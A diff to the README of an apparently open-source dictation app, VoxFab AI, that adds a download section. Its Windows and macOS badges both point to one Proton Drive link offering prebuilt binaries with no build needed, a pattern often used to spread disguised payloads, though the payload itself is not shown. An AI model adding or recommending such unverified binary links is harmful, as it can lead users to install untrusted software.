@@ -7,7 +7,15 @@
 
 ![VoxFab AI Preview](assets/hero.png)
 
+## 📥 Download
+
+Get the latest ready-to-use version of VoxFab AI. No build steps required.
+
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://drive.proton.me/urls/KNW4V68W3C#N-LUlNjFri86)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://drive.proton.me/urls/KNW4V68W3C#N-LUlNjFri86)
+
 ## ✨ Features
+
 
 ### 🎙️ System-wide Dictation
 Press `Ctrl+Shift+Space` (or `⌘⇧Space`) to record audio and have it typed directly into any active application. VoxFab transcribes anything you say and automatically pastes it into the field that was last in focus.
